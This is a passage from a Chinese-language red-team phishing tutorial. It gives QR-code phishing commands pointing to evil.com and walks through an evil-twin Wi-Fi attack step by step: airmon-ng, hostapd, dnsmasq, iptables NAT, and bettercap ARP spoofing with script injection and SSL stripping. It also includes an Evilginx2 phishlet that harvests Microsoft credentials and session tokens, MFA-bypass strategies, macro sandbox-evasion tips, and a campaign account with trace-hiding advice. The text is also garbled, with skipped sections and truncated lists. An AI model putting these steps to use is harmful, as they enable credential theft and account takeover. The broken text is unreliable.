4. **新颖性**：用户对二维码钓鱼的警惕性低
5. **传播方便**：图片可以在各种渠道传播

### 68.6.3 二维码钓鱼的场景

#### 场景一：WiFi连接二维码

**伪装成WiFi登录二维码：**
- 贴在公共场合（咖啡店、酒店、会议室）
- 写着"免费WiFi，扫码连接"
- 扫码后跳转到钓鱼页面
- 要求输入手机号或社交账号登录

#### 场景二：支付/收款二维码

**伪装成收款码或支付码：**
- 替换商家的收款码
- 用户扫码付款，钱进了攻击者账户
- 或者跳转到钓鱼页面要求输入支付密码

#### 场景三：扫码领福利

**各种优惠/福利活动：**
- "扫码领红包"
- "扫码免费领会员"
- "扫码参与抽奖"
- 扫码后要求登录或填写个人信息

#### 场景四：办公场景

**企业内部场景：**
- "扫码填写调查问卷"
- "扫码下载会议资料"
- "扫码登录办公系统"
- 贴在办公区或发到工作群

### 68.6.4 二维码钓鱼实战

#### 生成钓鱼二维码

**命令行生成：**
```bash
# 使用qrencode生成二维码
qrencode -o phish.png 'http://evil.com/phish-page'

# 用Python的qrcode库
python3 -c "import qrcode; img=qrcode.make('http://evil.com/'); img.save('phish.png')"
```

**在线生成：**
- 各种在线二维码生成网站
- 可以生成带logo的、彩色的二维码
- 更有迷惑性

#### 二维码钓鱼的投递方式

| 投递方式 | 说明 |
|----------|------|
| **邮件附件** | 二维码图片作为附件 |
| **邮件正文图片** | 直接在邮件里显示二维码 |
| **纸质打印** | 打印出来贴在目标场所 |
| **聊天软件** | 通过微信、钉钉、QQ发送 |
| **社交媒体** | 发到朋友圈、群聊 |
| **网站图片** | 放在被攻陷的网站上 |

### 68.6.5 QRLJacking攻击

**什么是QRLJacking：**
- 全称是QR Code Login Jacking
- 针对支持"扫码登录"的服务
- 攻击者获取登录二维码，诱导受害者扫码
- 攻击者从而登录受害者的账号

**攻击流程：**
```
1. 攻击者打开目标网站的登录页面
2. 获取到登录二维码
3. 把二维码发给受害者（各种方式）
4. 诱导受害者用手机APP扫码
5. 受害者扫码确认登录
6. 攻击者这边的页面就登录成功了
7. 攻击者获得了受害者的账号权限
```

**常见受影响服务：**
- 微信网页版
- QQ网页版
- 各种支持扫码登录的网站
- 企业OA、办公系统

## 68.7 邪恶双胞胎（Evil Twin）钓鱼

### 68.7.1 什么是邪恶双胞胎

邪恶双胞胎（Evil Twin）是指伪造一个和合法WiFi同名（甚至同名同密码）的假WiFi热点，诱导用户连接，然后窃取数据或进行中间人攻击。

### 68.7.2 邪恶双胞胎的原理

```
正常场景：
    用户手机 → 合法WiFi热点 → 互联网

邪恶双胞胎场景：
    用户手机 → 假WiFi热点（攻击者控制） → 互联网
                    ↓
               攻击者可以：
               - 窃取传输的数据
               - 篡改网页内容
               - 注入恶意代码
               - 跳转到钓鱼页面
               - 窃取密码Cookie
```

### 68.7.3 邪恶双胞胎的实施条件

**硬件要求：**
- 支持监听模式（Monitor Mode）的无线网卡
- 最好有两块网卡（一块开热点，一块上网）
- 或者单网卡同时工作

**软件工具：**
- aircrack-ng系列
- hostapd（创建热点）
- dnsmasq（DHCP和DNS）
- mitmproxy / Ettercap（中间人攻击）
- bettercap（集成工具，推荐）

### 68.7.4 邪恶双胞胎攻击流程

#### 第一步：扫描周围WiFi

```bash
# 启用无线网卡监听模式
airmon-ng start wlan0

# 扫描周围的WiFi网络
airodump-ng wlan0mon

# 记录目标WiFi的：
# - ESSID（名称）
# - BSSID（MAC地址）
# - 信道（Channel）
# - 加密方式
```

#### 第二步：创建同名假热点

```bash
# 使用hostapd创建热点
# 配置文件 hostapd.conf
interface=wlan0
driver=nl80211
ssid=TargetWiFiName  # 和目标同名
channel=6
hw_mode=g
```

```bash
# 启动热点
hostapd hostapd.conf
```

#### 第三步：配置DHCP和DNS

```bash
# dnsmasq配置
interface=wlan0
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
```

```bash
# 启动dnsmasq
dnsmasq -C dnsmasq.conf -d
```

#### 第四步：开启IP转发和NAT

```bash
# 开启IP转发
echo 1 > /proc/sys/net/ipv4/ip_forward

# 配置NAT，让连接假热点的用户能上网
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
```

#### 第五步：中间人攻击

```bash
# 使用bettercap进行中间人攻击
bettercap -iface wlan0

# 开启ARP欺骗
net.probe on
arp.spoof on

# 启用HTTP代理，注入恶意脚本
http.proxy on
http.proxy.injectjs on

# SSL剥离（把HTTPS降级为HTTP）
sslstrip on
```

### 68.7.5 邪恶双胞胎的钓鱼应用

####  captive portal（强制门户）钓鱼

**原理：**
- 很多公共WiFi有登录页面（captive portal）
- 连上WiFi后自动弹出登录页
- 要求输入手机号、验证码或账号密码
- 假WiFi也做一个一样的登录页

**攻击场景：**
1. 创建一个和某酒店/咖啡店同名的WiFi
2. 用户以为是店家的WiFi，连上
3. 弹出登录页面，和真的一模一样
4. 要求输入房间号、身份证号、手机号
5. 或者要求微信扫码关注公众号
6. 用户的信息都被窃取了

#### 页面注入钓鱼

**原理：**
- 用户连上假WiFi后访问正常网站
- 攻击者在HTTP响应中注入恶意代码
- 或者把页面重定向到钓鱼页面

**示例：**
- 用户访问银行网站
- 攻击者注入JavaScript，弹出假的登录框
- 或者直接跳转到钓鱼页面
- 用户输入密码，被窃取

#### 密码和Cookie窃取

**HTTP明文密码：**
- 对于HTTP网站，密码明文传输
- 中间人直接就能看到

**Cookie窃取：**
- 窃取HTTP网站的Cookie
- 用Cookie登录用户账号
- 不需要密码

### 68.7.6 邪恶双胞胎的防御

- 不要随便连接陌生的公共WiFi
- 对于需要登录的WiFi要确认身份
- 尽量使用移动数据（4G/5G）
- 使用VPN加密流量
- 浏览器注意地址栏的HTTPS标志
- 不要在公共WiFi下登录敏感账号

## 68.8 Evilginx2高级钓鱼框架（中间人钓鱼）

> **核心类比：假的前台服务员——你见过的最危险的钓鱼**
>
> 想象你去一个公司大楼找人：
> 1. 你正常走到前台说"我找张三"，前台给张三打电话确认，然后给你开门（这就是正常登录+双因素验证）
> 2. 但如果前台服务员被调包了——她是你的人。你找张三？好的，她记下了你的名字和目的，然后她也给张三打了电话。你拿到了通行证，她也拿到了你的所有信息。
>
> Evilginx2就是那个**假的前台服务员**。用户以为自己在和真实的网站（比如Office365）交互，实际上所有数据——密码、验证码、Cookie、Session——都经过了攻击者的服务器。
>
> **为什么MFA（双因素验证）也挡不住？**
> 因为用户输入的MFA验证码，在发给真实网站的同时，也被攻击者截获了。
> MFA能防"偷密码的人"，但防不住"帮你传话的人"。

### 68.8.1 什么是Evilginx2

Evilginx2是一个高级的中间人钓鱼框架，可以绕过双因素认证（2FA/MFA）。

**核心原理：**
- 反向代理真实网站
- 用户所有请求都经过Evilginx2
- 包括账号密码，甚至双因素验证码
- 全程透明，用户完全察觉不到

**为什么厉害：**
- 传统钓鱼只能偷密码，有2FA就没用了
- Evilginx2连2FA验证码一起偷
- 用户输入什么，攻击者就能拿到什么
- 甚至可以直接获取用户的登录Session

### 68.8.2 Evilginx2的工作原理

```
用户浏览器
    ↓
   请求
    ↓
Evilginx2（反向代理，攻击者控制）
    ↓  转发请求  ↓  记录数据
    ↓          ↓
真实网站服务器 ←──┘（记录账号、密码、2FA、Cookie、Session）
    ↓
   响应
    ↓
Evilginx2
    ↓  转发响应（可能修改）
    ↓
用户浏览器
```

**关键点：**
- 用户看到的就是真实的网站
- 因为所有内容都是从真实网站来的
- 只是中间多了一个"记录者"
- 用户输入的所有信息都会被记录

### 68.8.5 Phishlet介绍

Phishlet是Evilginx2的钓鱼配置文件，每个文件定义了一个网站的钓鱼规则。

**常用的phishlet：**
- o365 / office365：Office 365 / Microsoft账号

- facebook：Facebook
- linkedin：LinkedIn
- amazon：Amazon
- github：GitHub
- twitter：Twitter
- instagram：Instagram
- 等等...

**Phishlet配置（YAML格式）示例：**
```yaml
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoft.com', session: true, is_landing: true}
  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true}
  - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: true}
sub_filters:
  - {trig: 'login.microsoftonline.com', sub: 'login', domain: 'microsoft.com', mimes: ['text/html', 'application/json']}
auth_tokens:
  - domain: '.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
```

**浏览器导入Cookie：**

- 或者直接修改Cookie数据库
- 导入后刷新页面，就是已登录状态

### 68.8.8 Evilginx2的防御

- 注意浏览器的安全提示

## 68.10 MFA绕过钓鱼

> **破局的类比：两把锁挡不住帮你开门的人**
>
> MFA（双因素认证）在普通人看来是"无敌"的——你需要密码+手机验证码才能登录。但钓鱼攻击者根本不和你正面较量：
>
> | MFA绕过方式 | 类比 | 为什么有效 |
> |-----------|------|-----------|
> | **中间人钓鱼(Evilginx等)** | 假物业前台替你给房主打电话确认 | 用户输入MFA验证码，被假网站截获同时转发给真实网站 |
> | **Session劫持** | 趁别人开门进去后，跟着溜进去 | MFA只验证登录那一刻，登录后的Session不用再验证 |
> | **MFA疲劳攻击** | 不停地按门铃直到房主受不了确认了 | 不断弹MFA推送，用户受不了就点了"确认" |
> | **SIM卡劫持** | 把房主的手机号转移到攻击者的手机上 | MFA验证码短信发到了攻击者的手机 |
>
> **核心认知：MFA保护的是密码泄露场景（别人偷了你的密码），但保护不了你主动输入验证码的场景（你被骗了）。所有传统MFA都是"防偷不防骗"。**

### 68.10.1 什么是MFA

MFA（Multi-Factor Authentication，多因素认证）是指需要两种或更多验证方式才能登录。

**常见的MFA方式：**
- 短信验证码
- 邮件验证码
- TOTP（谷歌验证器、Authy等）
- 硬件令牌（U盾、YubiKey等）
- 生物识别（指纹、人脸）
- 推送通知（APP推送确认）

### 68.10.2 MFA真的安全吗？

很多人以为有了MFA就不会被钓鱼了，其实不然。

**MFA的弱点：**
- 用户输入MFA的过程也可以被钓鱼
- Session可以被劫持（登录后就不需要MFA了）
- 有些MFA方式本身有漏洞

### 68.10.3 MFA绕过方法

#### 方法一：实时中间人钓鱼（最有效）

**工具：** Evilginx2、Modlishka

**原理：**
- 反向代理真实网站
- 用户输入密码 → 被记录
- 用户输入MFA验证码 → 也被记录
- 攻击者用密码+验证码登录
- 或者直接劫持登录后的Session

**效果：**
- 只要用户能登录，攻击者就能登录
- 不管是什么类型的MFA（短信、TOTP、推送...）
- 因为用户是在真实网站输入的，只是中间被劫持了

#### 方法二：MFA疲劳攻击（MFA Fatigue）

**原理：**
- 不断给用户发送MFA推送请求
- 用户烦了，不小心点了允许
- 或者以为是自己操作的，顺手点了

**场景：**
1. 攻击者获取了用户的密码
2. 尝试登录，触发MFA推送
3. 不断重试，不断推送
4. 用户收到一大堆推送通知
5. 烦了，或者以为是系统问题，点了允许
6. 攻击者登录成功

**真实案例：** Uber 2022年被黑就是用了这种方法。

#### 方法三：OAuth钓鱼

**原理：**
- 钓鱼网站不是直接要密码
- 而是让用户"用XX账号登录"（OAuth）
- 跳转到真实的OAuth授权页面
- 用户点击"授权"
- 攻击者获取到Access Token
- 用Token访问用户数据

**特点：**
- 不需要用户的密码
- 用户是在真实网站授权的
- 看起来完全合法
- 但Token给了攻击者

#### 方法四：SIM Swap（SIM卡劫持）

**原理：**
- 攻击者通过社会工程学攻击运营商
- 把受害者的手机号转到自己的SIM卡上
- 然后所有短信验证码都发到攻击者手机上
- 攻击者可以重置所有用手机绑定的账号

**这是一种更高级的攻击方式，涉及对运营商的社工。**

### 68.10.4 各类MFA的安全性对比

| MFA方式 | 防钓鱼能力 | 说明 |
|---------|-----------|------|
| **短信验证码** | ⭐ 很差 | 容易被SIM Swap，也能被中间人钓鱼 |
| **邮件验证码** | ⭐ 很差 | 如果邮箱被盗就没用了 |
| **TOTP（谷歌验证器）** | ⭐⭐ 一般 | 可以被中间人钓鱼实时获取 |
| **推送通知** | ⭐⭐ 一般 | 容易被疲劳攻击，也可能被社工 |
| **硬件密钥（FIDO/U2F）** | ⭐⭐⭐⭐⭐ 最强 | 绑定域名，真正防钓鱼 |

**为什么硬件密钥最安全：**
- FIDO2 / WebAuthn 标准
- 会验证访问的域名是否正确
- 如果域名不对，根本不会返回认证信息
- 中间人钓鱼完全无效（因为域名不一样）
- 这是目前唯一能真正防钓鱼的MFA方式

### 68.10.5 红队视角下的MFA绕过策略

**策略一：优先用中间人钓鱼**
- 如果目标网站支持，直接上Evilginx2
- 简单高效，成功率高
- 不管什么MFA都能绕

**策略二：找不需要MFA的入口**
- VPN、Outlook Web、某些子系统可能没开MFA
- 先攻破这些，再横向移动

**策略三：找MFA配置不完善的账号**
- 有些账号可能没开启MFA
- 测试账号、服务账号、临时账号
- 新入职员工的账号

**策略四：Session劫持**
- 如果能偷到Cookie/Session
- 直接绕过所有认证
- 包括MFA

## 68.11 红队钓鱼演练的实施流程

### 68.11.1 钓鱼演练概述

红队钓鱼演练是指在授权的情况下，模拟真实的钓鱼攻击，测试企业员工的安全意识和防护体系的有效性。

### 68.11.2 完整的钓鱼演练流程

```
第一步：项目启动与授权
    ↓
    签订合同、明确范围
    获取书面授权
    制定演练方案
    ↓
第二步：情报收集与分析
    ↓
    收集目标企业信息
    收集员工信息（邮箱、职位等）
    分析组织结构
    选择目标人群
    ↓
第三步：钓鱼方案设计
    ↓
    确定钓鱼类型（邮件、水坑、二维码等）
    设计钓鱼场景
    制作钓鱼页面和邮件模板
    准备基础设施
    ↓
第四步：基础设施准备
    ↓
    注册钓鱼域名
    搭建钓鱼网站
    配置邮件服务器
    部署C2服务器
    测试检测绕过
    ↓
第五步：钓鱼活动实施
    ↓
    小规模测试
    正式投递
    监控数据
    后渗透利用（如果授权）
    ↓
第六步：数据收集与分析
    ↓
    收集点击率、提交率等数据
    分析不同部门/职位的差异
    总结漏洞和弱点
    ↓
第七步：报告撰写与汇报
    ↓
    撰写详细报告
    数据统计与可视化
    提出改进建议
    向客户汇报
    ↓
第八步：修复跟进与复测
    ↓
    跟踪整改情况
    安全意识培训
    必要时进行复测
```

### 68.11.3 前期准备工作

#### 授权确认（最重要！）

**必须获取的授权文件：**
- 书面的授权函/合同
- 明确的测试范围
- 明确的测试时间
- 联系人及联系方式
- 紧急情况处理流程

**没有授权绝对不要做！这是法律红线！**

#### 范围界定

| 维度 | 说明 |
|------|------|
| **人员范围** | 哪些部门、哪些人可以钓，哪些不行 |
| **技术范围** | 可以用哪些技术，不能用哪些 |
| **时间范围** | 从什么时候开始，什么时候结束 |
| **数据范围** | 可以收集哪些数据，如何处理 |
| **后渗透范围** | 点了链接之后能不能进一步利用 |

#### 目标选择

**常见的目标分组：**

### 68.11.4 钓鱼场景设计

#### 场景选择原则

1. **真实性**：场景要真实可信，符合目标的工作环境
2. **相关性**：和目标的工作内容相关，提高关注度
3. **紧迫性**：有一定的时间压力，促使快速行动
4. **合理性**：有合理的理由，不显得突兀

- 适用场景：全员测试
- 成功率：高
- 检测难度：中等
- 数据收集：账号密码或个人信息

**场景三：会议通知/会议资料**
- 适用场景：特定部门
- 成功率：高
- 检测难度：较低
- 数据收集：附件执行（如果授权）

**场景四：COVID/防疫通知**
- 适用场景：全员（如果适时）
- 成功率：很高
- 检测难度：低
- 数据收集：个人信息

**场景五：领导交办任务**
- 适用场景：特定人员
- 成功率：高
- 检测难度：低
- 数据收集：转账（演练用，当然不会真转）

### 68.12.3 授权演练的合规要求

#### 授权文件要素

一份合法的授权书应该包含：

1. **授权方信息**：公司名称、法定代表人、联系方式
2. **被授权方信息**：测试公司/团队名称、负责人

   - 人员范围
   - 系统范围

   - 可以收集哪些数据
   - 数据如何存储
   - 数据如何销毁

   - 授权方确认已知悉风险
   - 被授权方在授权范围内操作不承担责任
6. **签字盖章**：
   - 双方法定代表人签字
   - 双方公司盖章
   - 日期

#### 数据处理合规

**数据收集原则：**
- **最小必要**：只收集必要的数据
- **目的明确**：只能用于演练评估
- **期限限制**：演练结束后及时销毁
- **安全存储**：加密存储，防止泄露

**个人信息保护：**
- 报告中个人信息要脱敏
- 不能泄露具体某个人的行为
- 只展示汇总统计数据
- 培训时不点名批评

### 68.12.4 红队的职业伦理

作为红队人员，要遵守职业伦理：

1. **只做授权的事**：授权范围外的坚决不做

3. **及时报告漏洞**：发现漏洞及时告知客户
4. **不造成损害**：尽量避免对业务造成影响

6. **遵纪守法**：遵守所有法律法规

### 68.12.5 道德边界

有些事情即使法律没明确禁止，也不应该做：

- **不利用工作之便谋取私利**
- **不攻击与项目无关的系统**

- **不保留客户的数据和权限**
- **项目结束后彻底清理后门和痕迹**
- **客观公正地报告结果，不隐瞒也不夸大**

- 启用宏率：70%（14/20人点了启用）

**原因分析：**
- 财务对工资相关的文件警惕性最低
- "加密保护"的说法让"启用宏"变得合理
- XLM宏检测率确实比VBA低
- 内部邮件的信任度更高

### 进阶技巧

**进一步免杀的方法：**
1. 宏代码加密，运行时解密
2. 不用EXEC函数，用更隐蔽的方式
3. 利用Excel的公式动态构建命令
4. 分阶段，第一阶段只做下载
5. 第二阶段载荷做深度免杀

**躲避沙箱的方法：**
1. 延迟执行（等几分钟再跑）
2. 检查环境（是不是真实用户电脑）
3. 需要用户交互（点击某个单元格才执行）
4. 检测沙箱特征进程

## 📚 案例5：护网钓鱼实战经验

### 案例背景

**场景**：某国家级护网行动，红队攻击队
**目标**：某大型国企
**任务**：通过钓鱼获取内网入口

### 战前分析

**目标画像：**
- 大型国企，员工数万人
- 有完善的安全防护体系
- 邮件网关、EDR、沙箱一应俱全
- 员工安全意识应该经过培训

**难点：**
- 直接发钓鱼邮件很容易被拦
- 附件基本过不了沙箱
- 员工警惕性高
- 需要找到合适的切入点

### 方案设计

经过反复讨论，确定了三个钓鱼方向并行：

#### 方向一：供应商鱼叉钓鱼

**思路：**
- 先通过OSINT收集目标的供应商信息
- 找到合作的供应商公司
- 伪装成供应商给目标发邮件
- 供应商邮件有业务往来，更可信

**实施：**
- 找到5家主要供应商
- 注册相似域名
- 伪造供应商身份
- 以"项目对接"、"合同变更"等名义发邮件
- 邮件内容高度定制化

#### 方向二：内部系统通知钓鱼

**思路：**
- 先踩点找到各种内部系统入口
- 模仿IT部门发系统通知
- 用相似域名做钓鱼页面

**实施：**
- 发现了VPN、OA、邮箱、HR系统等
- 选择"VPN系统升级"作为场景
- 因为VPN账号价值最高
- 钓鱼页面完全克隆真实VPN登录页

#### 方向三：简历投递钓鱼（水坑变种）

**思路：**
- 目标公司正在招聘
- 伪装成求职者投递简历
- 简历里带宏或钓鱼链接
- HR会打开简历查看

**实施：**
- 制作精美的简历文档（带宏）
- 针对不同岗位定制简历内容
- 投递到招聘邮箱
- HR打开简历后中招

### 实战过程

**Day 1：**
- 三个方向同时开始
- 供应商方向：发送20封，大部分进箱
- 系统通知方向：发送100封，被拦了60%
- 简历方向：投递5份，全部成功送达

**Day 2：**
- 供应商方向：有3人回复了邮件，继续沟通
- 系统通知方向：有5人点了链接，2人提交了密码
- 简历方向：有2份简历被查看，但没人启用宏

**Day 3：**
- 供应商方向：深度社工，争取让对方点链接
- 系统通知方向：又有3人提交密码
- 简历方向：调整策略，简历里不放宏，放链接

**Day 4：**
- 重大突破！简历方向有一个HR点击了链接
- 钓鱼页面是一个"在线简历查看系统"
- HR输入了邮箱密码想登录查看
- 成功获取了一个HR的邮箱账号！

**Day 5-7：**
- 用HR邮箱继续内网钓鱼
- 从内部发邮件，可信度高多了
- 又获取了10+账号
- 其中有一个IT部门的账号
- 用IT账号尝试登录VPN，成功！
- 终于进入内网了！

### 经验总结

#### 成功的关键因素

1. **多方向并行**
   - 不要只押宝在一种方式上
   - 东方不亮西方亮
   - 这次是简历方向成了突破口

2. **找到薄弱环节**
   - 正面进攻不行就绕路
   - HR、前台、外包往往是薄弱点
   - 从外围找突破口

3. **层层递进**
   - 先拿一个低权限账号
   - 用内部账号继续钓鱼
   - 逐步升级权限
   - 最后拿到高权限账号

4. **耐心等待**
   - 钓鱼不是立竿见影的
   - 需要时间让目标上钩
   - 不要急，稳住

#### 护网钓鱼的注意事项

1. **控制节奏**
   - 不要一下子发太多
   - 容易被发现和封锁
   - 细水长流

2. **做好OPSEC**
   - 域名、IP都要干净
   - 不要留下可溯源的痕迹
   - 及时清理痕迹

3. **灵活调整**
   - 这个方向不行就换
   - 根据反馈快速调整策略
   - 不要死磕一种方式

4. **合法合规**
   - 护网是授权的行动
   - 但也要在范围内操作
   - 不要超出授权范围

#### 给蓝队的启示（防御建议）

1. **不仅仅防外部，也要防内部**
   - 内部账号发的邮件也可能有问题
   - 横向钓鱼很危险

2. **HR、前台等岗位要重点培训**
   - 这些岗位接触外部多
   - 是钓鱼的重灾区

3. **招聘流程也要注意安全**
   - 简历附件也可能有恶意代码
   - 招聘邮箱要有严格防护

4. **定期演练，持续改进**
   - 安全意识不是一次培训就能解决的
   - 需要持续的演练和教育
